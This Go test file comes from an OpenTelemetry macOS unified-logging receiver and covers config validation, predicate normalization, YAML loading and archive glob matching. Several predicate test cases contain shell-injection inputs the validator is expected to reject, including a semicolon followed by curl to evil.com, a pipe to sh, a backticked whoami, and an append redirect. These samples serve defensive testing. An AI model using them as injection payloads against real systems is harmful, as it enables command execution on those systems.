// Copyright The OpenTelemetry Authors
// SPDX-License-Identifier: Apache-2.0

//go:build darwin

package macosunifiedloggingreceiver

import (
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/stretchr/testify/require"
	"go.opentelemetry.io/collector/confmap/confmaptest"
)

func TestConfigValidate(t *testing.T) {
	testCases := []struct {
		desc        string
		makeCfg     func(t *testing.T) *Config
		expectedErr string
	}{
		{
			desc: "valid config - live mode",
			makeCfg: func(_ *testing.T) *Config {
				return &Config{
					MaxPollInterval: 50 * time.Second,
					MaxLogAge:       12 * time.Hour,
				}
			},
		},
		{
			desc: "invalid archive path - does not exist",
			makeCfg: func(t *testing.T) *Config {
				return &Config{
					ArchivePath: filepath.Join(t.TempDir(), "missing", "logs.logarchive"),
				}
			},
			expectedErr: "no such file or directory",
		},
		{
			desc: "invalid archive path - not a directory",
			makeCfg: func(_ *testing.T) *Config {
				return &Config{
					ArchivePath: "./README.md",
				}
			},
			expectedErr: "must be a directory",
		},
		{
			desc: "archive glob requires at least one match",
			makeCfg: func(t *testing.T) *Config {
				return &Config{
					ArchivePath: filepath.Join(t.TempDir(), "*.logarchive"),
				}
			},
			expectedErr: "no archive paths matched the provided pattern",
		},
		{
			desc: "end time requires archive path",
			makeCfg: func(_ *testing.T) *Config {
				return &Config{
					EndTime: "2024-01-02 00:00:00",
				}
			},
			expectedErr: "end_time can only be used with archive_path",
		},
		{
			desc: "valid predicate with AND",
			makeCfg: func(_ *testing.T) *Config {
				return &Config{
					Predicate: "subsystem == 'com.apple.example' AND messageType == 'Error'",
				}
			},
		},
		{
			desc: "valid predicate with && (normalized to AND)",
			makeCfg: func(_ *testing.T) *Config {
				return &Config{
					Predicate: "subsystem == 'com.apple.example' && messageType == 'Error'",
				}
			},
		},
		{
			desc: "valid predicate with || (normalized to OR)",
			makeCfg: func(_ *testing.T) *Config {
				return &Config{
					Predicate: "subsystem == 'com.apple.example' || messageType == 'Error'",
				}
			},
		},
		{
			desc: "valid predicate with comparison operators",
			makeCfg: func(_ *testing.T) *Config {
				return &Config{
					Predicate: "processID > 100 && processID < 1000",
				}
			},
		},
		{
			desc: "valid predicate with > comparison and spaces",
			makeCfg: func(_ *testing.T) *Config {
				return &Config{
					Predicate: "processID >100",
				}
			},
		},
		{
			desc: "invalid predicate - semicolon",
			makeCfg: func(_ *testing.T) *Config {
				return &Config{
					Predicate: "subsystem == 'test'; curl http://evil.com",
				}
			},
			expectedErr: "predicate contains invalid character",
		},
		{
			desc: "invalid predicate - pipe",
			makeCfg: func(_ *testing.T) *Config {
				return &Config{
					Predicate: "subsystem == 'test' | sh",
				}
			},
			expectedErr: "predicate contains invalid character",
		},
		{
			desc: "invalid predicate - dollar sign",
			makeCfg: func(_ *testing.T) *Config {
				return &Config{
					Predicate: "subsystem == '$HOME'",
				}
			},
			expectedErr: "predicate contains invalid character",
		},
		{
			desc: "invalid predicate - backtick",
			makeCfg: func(_ *testing.T) *Config {
				return &Config{
					Predicate: "subsystem == '`whoami`'",
				}
			},
			expectedErr: "predicate contains invalid character",
		},
		{
			desc: "invalid predicate - append redirect",
			makeCfg: func(_ *testing.T) *Config {
				return &Config{
					Predicate: "subsystem == 'test' >> /tmp/output",
				}
			},
			expectedErr: "predicate contains invalid character",
		},
		{
			desc: "predicate must contain valid field name",
			makeCfg: func(_ *testing.T) *Config {
				return &Config{
					Predicate: "unknownField == 'value'",
				}
			},
			expectedErr: "predicate must contain at least one valid field name",
		},
		{
			desc: "predicate must contain operator",
			makeCfg: func(_ *testing.T) *Config {
				return &Config{
					Predicate: "subsystem 'com.apple'",
				}
			},
			expectedErr: "predicate must contain at least one valid operator",
		},
		{
			desc: "predicate must contain valid event type when type is referenced",
			makeCfg: func(_ *testing.T) *Config {
				return &Config{
					Predicate: "type == 'invalidEvent'",
				}
			},
			expectedErr: "predicate must contain at least one valid event type",
		},
		{
			desc: "predicate must contain valid log type when logType is referenced",
			makeCfg: func(_ *testing.T) *Config {
				return &Config{
					Predicate: "logType == 'invalid'",
				}
			},
			expectedErr: "predicate must contain at least one valid log type",
		},
		{
			desc: "predicate must contain valid signpost scope when signpostScope is referenced",
			makeCfg: func(_ *testing.T) *Config {
				return &Config{
					Predicate: "signpostScope == 'invalid'",
				}
			},
			expectedErr: "predicate must contain at least one valid signpost scope",
		},
		{
			desc: "predicate must contain valid signpost type when signpostType is referenced",
			makeCfg: func(_ *testing.T) *Config {
				return &Config{
					Predicate: "signpostType == 'invalid'",
				}
			},
			expectedErr: "predicate must contain at least one valid signpost type",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.desc, func(t *testing.T) {
			cfg := tc.makeCfg(t)
			err := cfg.Validate()
			if tc.expectedErr != "" {
				require.ErrorContains(t, err, tc.expectedErr)
			} else {
				require.NoError(t, err)
			}
		})
	}
}

func TestPredicateNormalization(t *testing.T) {
	cfg := &Config{
		Predicate: "subsystem == 'test' && processID > 100 && messageType == 'Error'",
	}

	err := cfg.Validate()
	require.NoError(t, err)

	// Verify && was replaced with AND
	require.Equal(t, "subsystem == 'test' AND processID > 100 AND messageType == 'Error'", cfg.Predicate)
	require.NotContains(t, cfg.Predicate, "&&")
}

func TestLoadConfigFromYAML(t *testing.T) {
	// Create test archive directories for validation
	testdataDir := filepath.Join(".", "testdata")
	systemLogsArchive := filepath.Join(testdataDir, "system_logs.logarchive")
	logsArchive := filepath.Join(testdataDir, "logs.logarchive")

	// Create directories if they don't exist
	_ = os.MkdirAll(systemLogsArchive, 0o755)
	_ = os.MkdirAll(logsArchive, 0o755)
	defer func() {
		_ = os.RemoveAll(systemLogsArchive)
		_ = os.RemoveAll(logsArchive)
	}()

	testCases := []struct {
		name            string
		configKey       string
		expectedArchive string
		expectedPred    string
		expectedStart   string
		expectedEnd     string
		expectedPoll    time.Duration
		expectedMaxAge  time.Duration
	}{
		{
			name:           "live mode defaults",
			configKey:      "live_mode_defaults",
			expectedPoll:   30 * time.Second,
			expectedMaxAge: 24 * time.Hour,
		},
		{
			name:            "archive mode full",
			configKey:       "archive_mode_full",
			expectedArchive: "./testdata/system_logs.logarchive",
			expectedPred:    "subsystem == 'com.apple.systempreferences'",
			expectedStart:   "2024-01-01 00:00:00",
			expectedEnd:     "2024-01-02 00:00:00",
			expectedPoll:    60 * time.Second,
			expectedMaxAge:  48 * time.Hour,
		},
		{
			name:            "archive mode minimal",
			configKey:       "archive_mode_minimal",
			expectedArchive: "./testdata/logs.logarchive",
			expectedPoll:    0, // Will be set to default in Validate()
			expectedMaxAge:  0,
		},
		{
			name:           "live mode with predicate",
			configKey:      "live_mode_predicate",
			expectedPred:   "process == 'kernel' AND messageType == 'Error'",
			expectedPoll:   15 * time.Second,
			expectedMaxAge: 12 * time.Hour,
		},
		{
			name:            "archive mode time range",
			configKey:       "archive_mode_time_range",
			expectedArchive: "./testdata/system_logs.logarchive",
			expectedStart:   "2024-06-01 00:00:00",
			expectedEnd:     "2024-06-01 23:59:59",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			// Load the config from YAML file
			cm, err := confmaptest.LoadConf(filepath.Join("testdata", "test_config.yaml"))
			require.NoError(t, err)

			// Get the specific config section
			sub, err := cm.Sub(tc.configKey)
			require.NoError(t, err)

			// Unmarshal into Config struct
			cfg := &Config{}
			err = sub.Unmarshal(cfg)
			require.NoError(t, err)

			// Verify the config values were parsed correctly
			require.Equal(t, tc.expectedArchive, cfg.ArchivePath, "archive_path mismatch")
			require.Equal(t, tc.expectedPred, cfg.Predicate, "predicate mismatch")
			require.Equal(t, tc.expectedStart, cfg.StartTime, "start_time mismatch")
			require.Equal(t, tc.expectedEnd, cfg.EndTime, "end_time mismatch")

			if tc.expectedPoll > 0 {
				require.Equal(t, tc.expectedPoll, cfg.MaxPollInterval, "max_poll_interval mismatch")
			}
			if tc.expectedMaxAge > 0 {
				require.Equal(t, tc.expectedMaxAge, cfg.MaxLogAge, "max_log_age mismatch")
			}

			// Validate the config (should pass for valid configs)
			err = cfg.Validate()
			require.NoError(t, err)
		})
	}
}

func TestHasValidEventType(t *testing.T) {
	testCases := []struct {
		name      string
		predicate string
		expected  bool
	}{
		{
			name:      "contains valid event type - activityCreateEvent",
			predicate: "type == 'activityCreateEvent'",
			expected:  true,
		},
		{
			name:      "contains invalid event type",
			predicate: "type == 'invalidEvent'",
			expected:  false,
		},
		{
			name:      "does not contain event type field",
			predicate: "subsystem == 'com.apple.example'",
			expected:  false,
		},
		{
			name:      "empty predicate",
			predicate: "",
			expected:  false,
		},
		{
			name:      "contains event type in complex predicate",
			predicate: "type == 'logEvent' AND subsystem == 'com.apple.example'",
			expected:  true,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result := hasValidEventType(tc.predicate)
			require.Equal(t, tc.expected, result)
		})
	}
}

func TestHasValidLogType(t *testing.T) {
	testCases := []struct {
		name      string
		predicate string
		expected  bool
	}{
		{
			name:      "contains valid log type - default",
			predicate: "logType == 'default'",
			expected:  true,
		},
		{
			name:      "contains valid log type - release",
			predicate: "logType == 'release'",
			expected:  true,
		},
		{
			name:      "contains valid log type - info",
			predicate: "logType == 'info'",
			expected:  true,
		},
		{
			name:      "contains valid log type - debug",
			predicate: "logType == 'debug'",
			expected:  true,
		},
		{
			name:      "contains valid log type - error",
			predicate: "logType == 'error'",
			expected:  true,
		},
		{
			name:      "contains valid log type - fault",
			predicate: "logType == 'fault'",
			expected:  true,
		},
		{
			name:      "contains invalid log type",
			predicate: "logType == 'invalid'",
			expected:  false,
		},
		{
			name:      "does not contain logType field",
			predicate: "subsystem == 'com.apple.example'",
			expected:  false,
		},
		{
			name:      "empty predicate",
			predicate: "",
			expected:  false,
		},
		{
			name:      "contains log type in complex predicate",
			predicate: "logType == 'error' AND subsystem == 'com.apple.example'",
			expected:  true,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result := hasValidLogType(tc.predicate)
			require.Equal(t, tc.expected, result)
		})
	}
}

func TestHasValidSignpostScope(t *testing.T) {
	testCases := []struct {
		name      string
		predicate string
		expected  bool
	}{
		{
			name:      "contains valid signpost scope - thread",
			predicate: "signpostScope == 'thread'",
			expected:  true,
		},
		{
			name:      "contains valid signpost scope - process",
			predicate: "signpostScope == 'process'",
			expected:  true,
		},
		{
			name:      "contains valid signpost scope - system",
			predicate: "signpostScope == 'system'",
			expected:  true,
		},
		{
			name:      "contains invalid signpost scope",
			predicate: "signpostScope == 'invalid'",
			expected:  false,
		},
		{
			name:      "does not contain signpostScope field",
			predicate: "category == 'example'",
			expected:  false,
		},
		{
			name:      "empty predicate",
			predicate: "",
			expected:  false,
		},
		{
			name:      "contains signpost scope in complex predicate",
			predicate: "signpostScope == 'thread' AND type == 'signpostEvent'",
			expected:  true,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result := hasValidSignpostScope(tc.predicate)
			require.Equal(t, tc.expected, result)
		})
	}
}

func TestHasValidSignpostType(t *testing.T) {
	testCases := []struct {
		name      string
		predicate string
		expected  bool
	}{
		{
			name:      "contains valid signpost type - event",
			predicate: "signpostType == 'event'",
			expected:  true,
		},
		{
			name:      "contains valid signpost type - begin",
			predicate: "signpostType == 'begin'",
			expected:  true,
		},
		{
			name:      "contains valid signpost type - end",
			predicate: "signpostType == 'end'",
			expected:  true,
		},
		{
			name:      "contains invalid signpost type",
			predicate: "signpostType == 'invalid'",
			expected:  false,
		},
		{
			name:      "does not contain signpostType field",
			predicate: "subsystem == 'com.apple.example'",
			expected:  false,
		},
		{
			name:      "empty predicate",
			predicate: "",
			expected:  false,
		},
		{
			name:      "contains signpost type in complex predicate",
			predicate: "signpostType == 'begin' AND signpostScope == 'thread'",
			expected:  true,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result := hasValidSignpostType(tc.predicate)
			require.Equal(t, tc.expected, result)
		})
	}
}

func TestResolveArchivePathWithGlob(t *testing.T) {
	// Create temporary test directories
	tmpDir := t.TempDir()

	// Create test archive directories
	archive1 := filepath.Join(tmpDir, "archive1.logarchive")
	archive2 := filepath.Join(tmpDir, "archive2.logarchive")
	archive3 := filepath.Join(tmpDir, "other.logarchive")

	require.NoError(t, os.MkdirAll(archive1, 0o755))
	require.NoError(t, os.MkdirAll(archive2, 0o755))
	require.NoError(t, os.MkdirAll(archive3, 0o755))

	// Create a non-directory file that should be skipped
	filePath := filepath.Join(tmpDir, "not_an_archive.logarchive")
	require.NoError(t, os.WriteFile(filePath, []byte("not a directory"), 0o600))

	testCases := []struct {
		name        string
		pattern     string
		expectError bool
		expectedMin int // minimum number of matches expected
		validate    func(t *testing.T, matches []string)
	}{
		{
			name:        "glob pattern matches multiple archives",
			pattern:     filepath.Join(tmpDir, "archive*.logarchive"),
			expectError: false,
			expectedMin: 2,
			validate: func(t *testing.T, matches []string) {
				require.GreaterOrEqual(t, len(matches), 2)
				// Should contain archive1 and archive2
				hasArchive1 := false
				hasArchive2 := false
				for _, match := range matches {
					if filepath.Base(match) == "archive1.logarchive" {
						hasArchive1 = true
					}
					if filepath.Base(match) == "archive2.logarchive" {
						hasArchive2 = true
					}
				}
				require.True(t, hasArchive1, "should match archive1.logarchive")
				require.True(t, hasArchive2, "should match archive2.logarchive")
			},
		},
		{
			name:        "glob pattern matches single archive",
			pattern:     filepath.Join(tmpDir, "archive1.logarchive"),
			expectError: false,
			expectedMin: 1,
			validate: func(t *testing.T, matches []string) {
				require.Len(t, matches, 1)
				require.Equal(t, archive1, matches[0])
			},
		},
		{
			name:        "glob pattern with question mark",
			pattern:     filepath.Join(tmpDir, "archive?.logarchive"),
			expectError: false,
			expectedMin: 2,
			validate: func(t *testing.T, matches []string) {
				require.GreaterOrEqual(t, len(matches), 2)
			},
		},
		{
			name:        "glob pattern matches all archives",
			pattern:     filepath.Join(tmpDir, "*.logarchive"),
			expectError: false,
			expectedMin: 3,
			validate: func(t *testing.T, matches []string) {
				// Should match all 3 archives, but skip the file
				require.GreaterOrEqual(t, len(matches), 3)
				// Verify non-directory file is not included
				for _, match := range matches {
					require.NotEqual(t, filePath, match, "should not include non-directory file")
				}
			},
		},
		{
			name:        "invalid glob pattern",
			pattern:     filepath.Join(tmpDir, "[invalid"),
			expectError: true,
		},
		{
			name:        "glob pattern with no matches",
			pattern:     filepath.Join(tmpDir, "nonexistent*.logarchive"),
			expectError: false,
			expectedMin: 0,
			validate: func(t *testing.T, matches []string) {
				require.Empty(t, matches)
			},
		},
		{
			name:        "direct path without glob",
			pattern:     archive1,
			expectError: false,
			expectedMin: 1,
			validate: func(t *testing.T, matches []string) {
				require.Len(t, matches, 1)
				require.Equal(t, archive1, matches[0])
			},
		},
		{
			name:        "glob pattern with nested directory",
			pattern:     filepath.Join(tmpDir, "**", "*.logarchive"),
			expectError: false,
			expectedMin: 0, // May or may not match depending on doublestar behavior
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			matches, err := resolveArchivePath(tc.pattern)

			if tc.expectError {
				require.Error(t, err)
				require.Nil(t, matches)
			} else {
				require.NoError(t, err)
				require.GreaterOrEqual(t, len(matches), tc.expectedMin)
				if tc.validate != nil {
					tc.validate(t, matches)
				}
			}
		})
	}
}

func TestResolveArchivePathSkipsInvalidMatches(t *testing.T) {
	// Create temporary test directory
	tmpDir := t.TempDir()

	// Create a valid archive directory
	validArchive := filepath.Join(tmpDir, "valid.logarchive")
	require.NoError(t, os.MkdirAll(validArchive, 0o755))

	// Create a file (not a directory) that matches the pattern
	invalidArchive := filepath.Join(tmpDir, "invalid.logarchive")
	require.NoError(t, os.WriteFile(invalidArchive, []byte("not a directory"), 0o600))

	// Create a non-existent path that would match glob but doesn't exist
	nonexistentArchive := filepath.Join(tmpDir, "nonexistent.logarchive")

	// Test glob pattern that matches both valid and invalid paths
	pattern := filepath.Join(tmpDir, "*.logarchive")

	matches, err := resolveArchivePath(pattern)
	require.NoError(t, err)

	// Should only include the valid directory, skipping the file
	require.Contains(t, matches, validArchive, "should include valid archive directory")
	require.NotContains(t, matches, invalidArchive, "should skip non-directory file")
	require.NotContains(t, matches, nonexistentArchive, "should skip non-existent paths")
}
